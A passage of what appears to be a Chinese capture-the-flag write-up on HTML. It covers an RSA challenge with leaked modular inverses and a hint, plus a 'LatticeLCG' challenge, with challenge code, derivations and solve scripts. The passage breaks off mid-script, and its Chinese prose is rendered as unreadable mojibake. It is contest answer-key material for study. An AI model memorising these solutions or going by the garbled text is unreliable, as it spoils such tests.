class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>length = <span class="hljs-built_in">len</span>(flag)<br>flag1 = flag[:length//<span class="hljs-number">2</span>]<br>flag2 = flag[length//<span class="hljs-number">2</span>:]<br>e = <span class="hljs-number">65537</span><br><br>m1 = bytes_to_long(flag1)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br><br>p1 = gmpy2.invert(p,q)<br>q1 = gmpy2.invert(q,p)<br>c = <span class="hljs-built_in">pow</span>(m1,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p1=&quot;</span>,p1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q1=&quot;</span>,q1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;phi=&quot;</span>,phi)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p1= 3020925936342826638134751865559091272992166887636010673949262570355319420768006254977586056820075450411872960532347149926398408063119965574618417289548987</span><br><span class="hljs-string">q1= 4671408431692232396906683283409818749720996872112784059065890300436550189441120696235427299344866325968178729053396743472242000658751114391777274910146291</span><br><span class="hljs-string">c= 25112054943247897935419483097872905208058812866572413543619256987820739973912338143408907736140292730221716259826494247791605665059462509978370784276523708331832947651238752021415405546380682507724076832547566130498713598421615793975775973104012856974241202142929158494480919115138145558312814378701754511483</span><br><span class="hljs-string">phi= 57503658815924732796927268512359220093654065782651166474086873213897562591669139461637657743218269483127368502067086834142943722633173824328770582751298229218384634668803018140064093913557812104300156596305487698041934061627496715082394633864043543838906900101637618600513874001567624343801197495058260716932</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>m2 = bytes_to_long(flag2)<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m2, e, n)<br>hint = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2023</span> * p + <span class="hljs-number">114514</span>, q, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hint=&quot;</span>,hint)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n= 12775720506835890504634034278254395430943267336816473660983646973423280986156683988190224391394224069040565587173690009193979401332176772774003070053150665425296356891182224095151626957780349726980433545162004592720236315207871365869074491602494662741551613634958123374477023452496165047922053316939727488269523121920612595228860205356006298829652664878874947173274376497334009997867175453728857230796230189708744624237537460795795419731996104364946593492505600336294206922224497794285687308908233911851722675754289376914626682400586422368439122244417279745706732355332295177737063024381192630487607768783465981451061</span><br><span class="hljs-string">c= 11915755246503584850391275332434803210208427722294114071001100308626307947436200730224125480063437044802693983505018296915205479746420176594816835977233647903359581826758195341201097246092133133080060014734506394659931221663322724002898147351352947871411658624516142945817233952310735792476179959957816923241946083918670905682025431311942375276709386415064702578261223172000098847340935816693603778431506315238612938066215726795441606532661443096921685386088202968978123769780506210313106183173960388498229061590976260661410212374609180449458118176113016257713595435899800372393071369403114116302366178240855961673903</span><br><span class="hljs-string">hint= 3780943720055765163478806027243965253559007912583544143299490993337790800685861348603846579733509246734554644847248999634328337059584874553568080801619380770056010428956589779410205977076728450941189508972291059502282197067064652703679207594494311426932070873126291964667101759741689303119878339091991064473009603015444698156763131697516348762529243379294719509271792197450290763350043267150173332933064667716343268081089911389405010661267902446894363575630871542572200564687271311946580866369204751787686029541644463829030926902617740142434884740791338666415524172057644794094577876577760376741447161098006698524808</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>$\because p1\equiv p^{-1} \mod q$<br>$q1\equiv q^{-1} \mod p$<br>$\therefore p\cdot p1 \equiv 1 \mod q$<br>$q\cdot q1 \equiv 1 \mod p$<br>$\therefore p\cdot p1 &#x3D; 1+k1\cdot q$<br>$q\cdot q1 &#x3D; 1+k2\cdot p$<br>$\therefore p\cdot p1-1 &#x3D;k1\cdot q$<br>$q\cdot q1-1&#x3D;k2\cdot p$</p><blockquote><p>ps1ï¼šè¿™é‡Œé¦–å…ˆå·²çŸ¥$0&lt;p1&lt;q,0&lt;q1&lt;p$ï¼Œå› æ­¤æœ‰$k1\cdot q&lt;pq,k2\cdot p&lt;pq$ï¼Œåˆ™æœ‰$k1&lt;p,k2&lt;q$</p></blockquote><h4 id="1-è¯æ˜-k1-p-q1-k2-q-p1"><a href="#1-è¯æ˜-k1-p-q1-k2-q-p1" class="headerlink" title="(1)è¯æ˜$k1&#x3D;p-q1,k2&#x3D;q-p1$"></a>(1)è¯æ˜$k1&#x3D;p-q1,k2&#x3D;q-p1$</h4><p>ä¸¤å¼ç›¸å‡ï¼Œå¾—åˆ°<br>$p\cdot p1 -q\cdot q1 &#x3D; k1\cdot q - k2\cdot p$<br>åŒ–ç®€å¾—<br>$(p1+k2)\cdot p &#x3D; (q1+k1)\cdot q$<br>åˆ†æï¼Œç”±äº$p,q$è‚¯å®šæ˜¯äº’è´¨çš„ï¼Œè‹¥è¦æ»¡è¶³è¯¥ç­‰å¼ï¼Œå¿…ç„¶æœ‰$p$æ•´é™¤$q1+k1$ï¼Œ$q$æ•´é™¤$p1+k2$<br>å†ç”±å‰é¢ps1çš„ç»“è®ºå¯çŸ¥ï¼Œ$0&lt;q1+k1&lt;2\cdot p,0&lt;p1+k2&lt;2\cdot q$<br>$\therefore q1+k1&#x3D;p,p1+k2&#x3D;q$<br>å³$k1&#x3D;p-q1,k2&#x3D;q-p1$</p><h4 id="2-è¯æ˜-p1q1-k1k2-1"><a href="#2-è¯æ˜-p1q1-k1k2-1" class="headerlink" title="(2)è¯æ˜$p1q1-k1k2&#x3D;1$"></a>(2)è¯æ˜$p1q1-k1k2&#x3D;1$</h4><p>$pq\cdot p1q1-pp1-qq1+1&#x3D;k1k2\cdot pq$<br>å˜æ¢å¾—$(p1\cdot q1 - k1\cdot k2)\cdot pq&#x3D;pp1+qq1-1$<br>$\because p1&lt;q,q1&lt;p$<br>$\therefore 0&lt;(p1q1-k1k2)\cdot pq &lt;2\cdot pq$<br>$\therefore p1q1-k1k2&#x3D;1$</p><h4 id="3-æ„é€ äºŒæ¬¡æ–¹ç¨‹æ±‚-k"><a href="#3-æ„é€ äºŒæ¬¡æ–¹ç¨‹æ±‚-k" class="headerlink" title="(3)æ„é€ äºŒæ¬¡æ–¹ç¨‹æ±‚$k$"></a>(3)æ„é€ äºŒæ¬¡æ–¹ç¨‹æ±‚$k$</h4><p>$phi&#x3D;(p-1)\cdot (q-1)$<br>$&#x3D;(q1+k1-1)\cdot (p1+k2-1)$<br>$&#x3D;(q1-1+k1)\cdot (p1-1+k2)$<br>$&#x3D;(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+k2\cdot (q1-1)+k1k2$<br>$&#x3D;(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+\frac{p1q1-1}{k1}\cdot (q1-1)+p1q1-1$<br>ç§»é¡¹å¾—<br>$(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+\frac{p1q1-1}{k1}\cdot (q1-1)+p1q1-1-phi&#x3D;0$<br>å˜æ¢æˆå…³äº$k1$çš„ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹<br>$(p1-1)\cdot k1^2+[(q1-1)\cdot (p1-1)+p1q1-phi-1]\cdot k1+(p1q1-1)(q1-1)&#x3D;0$</p><p>ä¹‹åè§£æ–¹ç¨‹å¾—åˆ°æ•´æ•°$k1,k2$ï¼Œå†ä»£å…¥ä¾¿å¯ä»¥è®¡ç®—å‡º$p,q$ï¼Œä¹‹åä¾¿å¯ä»¥è§£å‡º$n,d$ï¼Œç›´æ¥è§£å¯†å¾—åˆ°flag</p><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>$\because hint\equiv (2023p+114514)^q  \mod n$<br>$\therefore hint\equiv 114514^q \mod p$<br>ç”±è´¹é©¬å°å®šç†å¾—$a^p\equiv  a \mod p$<br>$\therefore hint \equiv 114514^{pq}\mod p$<br>$\therefore hint-114514^n&#x3D;kp$<br>$\therefore p&#x3D;gcd(n,hint-114514^n)$</p><p><strong>ä»£ç ï¼š</strong></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br><span class="hljs-comment">#part1</span><br>p1= <span class="hljs-number">3020925936342826638134751865559091272992166887636010673949262570355319420768006254977586056820075450411872960532347149926398408063119965574618417289548987</span><br>q1= <span class="hljs-number">4671408431692232396906683283409818749720996872112784059065890300436550189441120696235427299344866325968178729053396743472242000658751114391777274910146291</span><br>cipher= <span class="hljs-number">25112054943247897935419483097872905208058812866572413543619256987820739973912338143408907736140292730221716259826494247791605665059462509978370784276523708331832947651238752021415405546380682507724076832547566130498713598421615793975775973104012856974241202142929158494480919115138145558312814378701754511483</span><br>phi= <span class="hljs-number">57503658815924732796927268512359220093654065782651166474086873213897562591669139461637657743218269483127368502067086834142943722633173824328770582751298229218384634668803018140064093913557812104300156596305487698041934061627496715082394633864043543838906900101637618600513874001567624343801197495058260716932</span><br>e = <span class="hljs-number">65537</span><br>d = gmpy2.invert(e, phi)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">a,b,c</span>):<br>    delta = b*b - <span class="hljs-number">4</span>*a*c<br>    <span class="hljs-keyword">if</span> delta &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    sqrt_delta = gmpy2.iroot(delta,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    k1 = (-b + sqrt_delta) // (<span class="hljs-number">2</span>*a)<br>    k2 = (-b - sqrt_delta) // (<span class="hljs-number">2</span>*a)<br>    <span class="hljs-keyword">return</span> k1, k2<br><br>a = p1-<span class="hljs-number">1</span><br>b = (q1-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>)+p1*q1-phi-<span class="hljs-number">1</span><br>c = (p1*q1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>k1,k2 = solve(a,b,c)<br><br><br><span class="hljs-keyword">if</span> (p1*q1-<span class="hljs-number">1</span>) % k1 == <span class="hljs-number">0</span>:<br>    k2 = (p1*q1-<span class="hljs-number">1</span>) // k1<br><span class="hljs-keyword">elif</span> (p1*q1-<span class="hljs-number">1</span>) % k2 == <span class="hljs-number">0</span>:<br>    k1,k2= k2,(p1*q1-<span class="hljs-number">1</span>) // k2<br><span class="hljs-comment">#print(k1,k2)</span><br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">#ä¿ç•™æ­£æ•°è§£</span><br><span class="hljs-string">k_candidates = [k for k in (k1, k2) if k &gt; 0 and (p1 * q1 - 1) % k == 0]</span><br><span class="hljs-string">if not k_candidates:</span><br><span class="hljs-string">    print(&quot;No valid k found&quot;)</span><br><span class="hljs-string">    exit()</span><br><span class="hljs-string">k1 = k_candidates[0]</span><br><span class="hljs-string">k2 = (p1 * q1 - 1) // k1 </span><br><span class="hljs-string">print(k1,k2)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>p =q1+k1<br>q =p1+k2<br>n = p * q<br>m1 = <span class="hljs-built_in">pow</span>(cipher, d, n)<br>ans1 = long_to_bytes(m1)    <br><span class="hljs-built_in">print</span>(ans1)<br><br><span class="hljs-comment">#part2</span><br>n= <span class="hljs-number">12775720506835890504634034278254395430943267336816473660983646973423280986156683988190224391394224069040565587173690009193979401332176772774003070053150665425296356891182224095151626957780349726980433545162004592720236315207871365869074491602494662741551613634958123374477023452496165047922053316939727488269523121920612595228860205356006298829652664878874947173274376497334009997867175453728857230796230189708744624237537460795795419731996104364946593492505600336294206922224497794285687308908233911851722675754289376914626682400586422368439122244417279745706732355332295177737063024381192630487607768783465981451061</span><br>cipher= <span class="hljs-number">11915755246503584850391275332434803210208427722294114071001100308626307947436200730224125480063437044802693983505018296915205479746420176594816835977233647903359581826758195341201097246092133133080060014734506394659931221663322724002898147351352947871411658624516142945817233952310735792476179959957816923241946083918670905682025431311942375276709386415064702578261223172000098847340935816693603778431506315238612938066215726795441606532661443096921685386088202968978123769780506210313106183173960388498229061590976260661410212374609180449458118176113016257713595435899800372393071369403114116302366178240855961673903</span><br>hint= <span class="hljs-number">3780943720055765163478806027243965253559007912583544143299490993337790800685861348603846579733509246734554644847248999634328337059584874553568080801619380770056010428956589779410205977076728450941189508972291059502282197067064652703679207594494311426932070873126291964667101759741689303119878339091991064473009603015444698156763131697516348762529243379294719509271792197450290763350043267150173332933064667716343268081089911389405010661267902446894363575630871542572200564687271311946580866369204751787686029541644463829030926902617740142434884740791338666415524172057644794094577876577760376741447161098006698524808</span><br><br>p = gmpy2.gcd(n, <span class="hljs-built_in">pow</span>(<span class="hljs-number">114514</span>,n,n)-hint )<br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>m2 = <span class="hljs-built_in">pow</span>(cipher, d, n)<br>ans2 = long_to_bytes(m2)<br><span class="hljs-built_in">print</span>(ans2)<br><span class="hljs-built_in">print</span>(ans1 + ans2)<br></code></pre></td></tr></table></figure><h2 id="LatticeLCG"><a href="#LatticeLCG" class="headerlink" title="LatticeLCG"></a>LatticeLCG</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******************************&#125;&#x27;</span><br><br>a = getPrime(<span class="hljs-number">512</span>)<br>seed = getPrime(<span class="hljs-number">512</span>)<br>b = bytes_to_long(flag)<br>n = getPrime(<span class="hljs-number">1024</span>)<br><br>e1 = <span class="hljs-number">2333</span><br>e2 = <span class="hljs-number">23333</span><br>c1 = <span class="hljs-built_in">pow</span>(a,e1,n)<br>c2 = <span class="hljs-built_in">pow</span>(a,e2,n)<br><br>output = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    seed = (a*seed+b)%n<br>    output.append(seed)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 = &quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 = &quot;</span>,c2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output1 = &quot;</span>,output[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output2 = &quot;</span>,output[<span class="hljs-number">1</span>])<br><br><br>e = [getPrime(<span class="hljs-number">128</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]<br>out = []<br>m = getPrime(<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    out.append(<span class="hljs-built_in">pow</span>(m,i,n))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;out=&quot;</span>,out)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c1 =  132894829064255831243210470637067717685821770359549730768366345840525257033166172926149293454192143005551270166547902269036843756318967855047301751521125394803373953151753927497701242767032542708689455184991906629946511295108898559666019232955132938245031352553261823905498810285940911315433144300083027795647</span><br><span class="hljs-string">c2 =  24086830909813702968855830967174364278115647345064163689290457852025690324300607354444884288995399344650789235347773145941872226843099538451759854505842021844881825309790171852845467221751852440178862638893185965125776165397575087879479327323737686652198357863042305078811580074617322063509435591981140533310</span><br><span class="hljs-string">output1 =  54997286032365904331111467760366122947903752273328087460831713533712307510311367648330090376100815622160705007873798883153287827481112070182047111994066594911019010222064952859306742931009422376955635523160546531204043294436812066746785938062292942759004837173423765427628610568097898331237064396308950601636</span><br><span class="hljs-string">output2 =  115015764780168428067411132384122324817310808727138440691727747976276050930701648349452842302609389394467134068064132550313721128807222231505312226682756817617177620169804112319332815872107656884931985435898097063491690413460967856530075292289784649593915313885813931026280791070577034075346669028068003251024</span><br><span class="hljs-string">e= [297332330847212015073434001239859795661, 247136911662054641479463124065475615181, 269964458627145370722389742095701827701, 270745917671094194052444327351021588037, 254010082507930275771798119457499420531, 219178601856077385518322602059961601013, 226562702503988968288128483964146379529, 236756812424464516919183114495913408541, 330800121752029915693039296018980956519, 244800084005240595691424199440981715431, 171753849214889522920105847094773384191, 175843874533972361422410968920873382741, 326554577162848075059517044795930784993, 181842368629269753698222635712342485771, 221634122983362091660188171985742369561, 314244561819808202322467576330355199409, 286703236198397527318161582654787197007, 298101543059628501506668748374542117409, 304158884506393754601331945634109778837, 227577031261920314010408499530794497453]</span><br><span class="hljs-string">out= [100163998802948218573427220530909801629443946118807841130458771881611961921044413091457977957530737347507311468578174294420439883266450142918647561103714976340598499984679873518770686239019753272419975426555435266764099822607336645955391865380657632176223122712125661464370522088500110746571354290680063421912, 123528268396018633078964378145622645321836134964966941909300627704018826667414656614011250938241127521627117348901416042868382174504514240509791471909819407751786633761392047187057200130450960708049681366686147337178110669163142189940397343388837018627392202704211693014162963133958078984558400205296509955066, 50364974727218716170137342348825758682286710377257708196467656986986475658591351848251278364177715325447140300281348027787487944839878770556527568407280736570303345044999352851718908253510696083227344179177110348363623815158409862985684687329665113210373028159714648637297476014803935686233984711925346269925, 9159042298258514259206302054907530984498816597282237786310355131965025367180505822032135021520906576471052417629425493533222088036674196397387325202128095476044308794426593565419139845832998557280786358482011226957053125314152322427131984411160984485669030286331376124575677908877399942011661647598763754231, 83466948172962290899792524342204996697711370224947233607865306692546824512672969402433314856742908546253967225963904395036102408684746619744412073888614033881366518452878344698289278946024167788789718690655953517892282374396760436658422838909903123439370164929347147855359470889455753772857233516742991766128, 72028057477369331020972407277180913909557985390590548305094935208898254733240351763155769013959589016793318772858662702447133499307826143247356049051993727167694036585280387890126287679890730586145740176250715386149857291210207281073772478229355625725300592003798974298248102432508449566953296818450441875311, 63397152736399466888877444377156185012692670493456346196278062009641363047685720620967313379507212944658351683022480839941265221126018392433078546696140135677499181555082643172378488800458657825640013090182171355299282023794908520172571785687147143015581400891531296496177973817400317905868361800342940667657, 45427004823510815929685208038284324980662968275105063862891077759131069014314933978878667052450145039482242546093735499108826130367476890384431317243013990394189191560941678120985717370542332803012619694821129395559214706968432476548145608291516176910849698455496733056096163035964057523545705356926187216133, 85046100612081858546755294340770681541320509587396377967875404950325314121709046137842413744740490231945105758075761946555179595664901813127463402854440384657046429776033129391138370272524736543471909307910018577738207910417672603889922445435939876023878220177983424547612635006926243055642166274730894301704, 5833380233103086014860892228744764647016585478949686583145531659689295506666493518453642500086277427538189091865461553097914845680665917702500908205558454036911757659426809969367680394533585635383007758339917554453268182491874683638880986360065633842854622244953985055815937671635222264056071882344388307409, 83587615309194701727032548415548847571046191382552371312058083137102227325098839286526833147951063338204327145093831238962818333112251936853329663907079943414231588222256242520221314528944937229985997926851198158564313703719031124442094987245466116488897263358510493905440842917634723859176839440753120904481, 108651960334634726889543063749359050688114025706494125848785084643330096858725917513596985853593252388835207675036982640195609499739937405655156895161071906340785173459426867946058638393154997931747445494284445204735492709747637173698383609764016673932827648159152658645291248613736662020472251048171789274368, 118612010487916657134965416492319303083994743753602531817008130269546146141506819718265549648441671373744766173780682168587021797626910931105508317440664521595783406848956221465897709761805869130021172013000282497881581247777388315282629463546261696169893882772397797722134711444928443061384985458691749569847, 106808406616890955924408992591724627593882118490933791849624747503316110669154243209826761617940864170830792705070618439466645580274835929100331418955890808763286193770831205511071440703609240364726061677822134370309018443508205980554831705850988319397384130044484586798585896460152167042282847992593429629533, 88091869606421350393441194783722851111189272445506506936925797213395319937783082680078622732926273935980894566775394134783157488360516905477700601820480975112122167589887641130656305741351643175495552454293030309247254533571254198691204714097846510872592569447050033289483493274672346210063885124570695832880, 94400859500860667431780782962782396345261822402898708716634581228428633704975879685572548692997007974004673676539496590659276952154740096463133011458100387006276325192223993452314873089466451613079029429327880672384210802191677586975844471189127835578979108767548290181668434770385199468588493042256788539610, 76177813724283720012398394789596589415486093955132688784865364048503447246391866424200071522136707581280434193680972230914105236504028522288780213089260160776489804587209115330412067560802680789338779056583047491942817016437672075192528508677997165703606520158178725128251694801612417667440677124932361973397, 17188209523466762369281362386525396145127294763502094183797065621821932913685690176344514910405677170931795652509426794846131051983826422536084073462084935517166603832542862106287058675490933197600813710203114108790043880150305327523679949543592622443904084453387396870899883324751789625806819506542619123964, 120007173989070249117019147454557020213723707722383599019972471016186584968096445904023372671513462965078400715365736756710078805039115601609874780421117795585342458478316236202328120583456334489780231976628584606042971207759763658961365139429661536955996519512283283500790612975034779837647053750631763512799, 18797057418663411295612229938999282286746920748194349166509084258061650142260043277698907538088835210620841171754186980908772147495732980563542600139935202965632319542217264685208215907551992891370166006725534397313373079841419662622936316343820775075897977228084528246337988431658221881343556854053475137330]</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>é¦–å…ˆè§‚å¯Ÿä»£ç åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†ï¼šæ±‚LCGçš„bï¼Œè¦æ±‚æˆ‘ä»¬çŸ¥é“$a,X_0,X_1,n$çš„å€¼ï¼Œ$a$çš„å€¼å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„å…±æ¨¡æ”»å‡»æ±‚å‡ºï¼Œè€Œ$n$çš„å€¼åˆ™éœ€è¦ç¬¬äºŒéƒ¨åˆ†æ±‚å‡º</li><li>ç¬¬äºŒéƒ¨åˆ†ï¼šæ±‚æ¨¡$n$ï¼Œå·²çŸ¥ä¸€ç»„RSAå¯†æ–‡å’Œå…¬é’¥ï¼Œç±»ä¼¼äºå…±æ¨¡æ”»å‡»ï¼Œä½†ä¸çŸ¥é“æ¨¡$n$ï¼Œç”±äº$m$æ˜¯å°å€¼ï¼Œä¸”æœ‰å¤šç»„æ•°æ®ï¼Œå› æ­¤è¿™éƒ¨åˆ†åº”è¯¥æ˜¯è¦åˆ©ç”¨æ ¼æ¥æ±‚æ¨¡$n$<br>æˆ‘ä»¬å…ˆè§£å†³ç¬¬äºŒéƒ¨åˆ†ï¼š<br>ç”±äº$e$å‡ä¸ºç´ æ•°ï¼Œå› æ­¤ä¸¤ä¸¤äº’è´¨ï¼Œå³æœ‰<br>$k_1e_1+k_2e_2+â€¦+k_ne_n&#x3D;1$<br>æ„é€ æ ¼å¦‚ä¸‹ï¼š</li></ul><span>$$\begin{bmatrix}k_1 & k_2 & \cdots & k_{20}\end{bmatrix}\begin{bmatrix}1 & 0 & 0 & \cdots & 0 & De_1 \\0 & 1 & 0 & \cdots & 0 & De_2 \\\vdots & \vdots &\vdots &\ddots & \vdots &\vdots \\0 & 0 & 0 &\cdots & 1 & De_{20}\end{bmatrix}=\begin{bmatrix}k_1 & k_2 & \cdots & k_{20} & 1\end{bmatrix}$$<\span><blockquote><p>psï¼šè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯$k$ç›®å‰çš„èŒƒå›´æ— æ³•ç¡®å®šï¼Œå› æ­¤$D$ä¹Ÿä¸å¥½ç›´æ¥ç¡®å®šï¼Œå› æ­¤å†³å®šè¿›è¡Œçˆ†ç ´</p></blockquote><p>ç„¶åä¾¿å¯ä»¥åˆ©ç”¨æ±‚å‡ºçš„$k$æ¥æ±‚$n$ï¼Œä¹‹åç¬¬ä¸€éƒ¨åˆ†ä¾¿å¯ä»¥è§£å†³äº†ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c1 =  <span class="hljs-number">132894829064255831243210470637067717685821770359549730768366345840525257033166172926149293454192143005551270166547902269036843756318967855047301751521125394803373953151753927497701242767032542708689455184991906629946511295108898559666019232955132938245031352553261823905498810285940911315433144300083027795647</span><br>c2 =  <span class="hljs-number">24086830909813702968855830967174364278115647345064163689290457852025690324300607354444884288995399344650789235347773145941872226843099538451759854505842021844881825309790171852845467221751852440178862638893185965125776165397575087879479327323737686652198357863042305078811580074617322063509435591981140533310</span><br>output1 =  <span class="hljs-number">54997286032365904331111467760366122947903752273328087460831713533712307510311367648330090376100815622160705007873798883153287827481112070182047111994066594911019010222064952859306742931009422376955635523160546531204043294436812066746785938062292942759004837173423765427628610568097898331237064396308950601636</span><br>output2 =  <span class="hljs-number">115015764780168428067411132384122324817310808727138440691727747976276050930701648349452842302609389394467134068064132550313721128807222231505312226682756817617177620169804112319332815872107656884931985435898097063491690413460967856530075292289784649593915313885813931026280791070577034075346669028068003251024</span><br>e= [<span class="hljs-number">297332330847212015073434001239859795661</span>, <span class="hljs-number">247136911662054641479463124065475615181</span>, <span class="hljs-number">269964458627145370722389742095701827701</span>, <span class="hljs-number">270745917671094194052444327351021588037</span>, <span class="hljs-number">254010082507930275771798119457499420531</span>, <span class="hljs-number">219178601856077385518322602059961601013</span>, <span class="hljs-number">226562702503988968288128483964146379529</span>, <span class="hljs-number">236756812424464516919183114495913408541</span>, <span 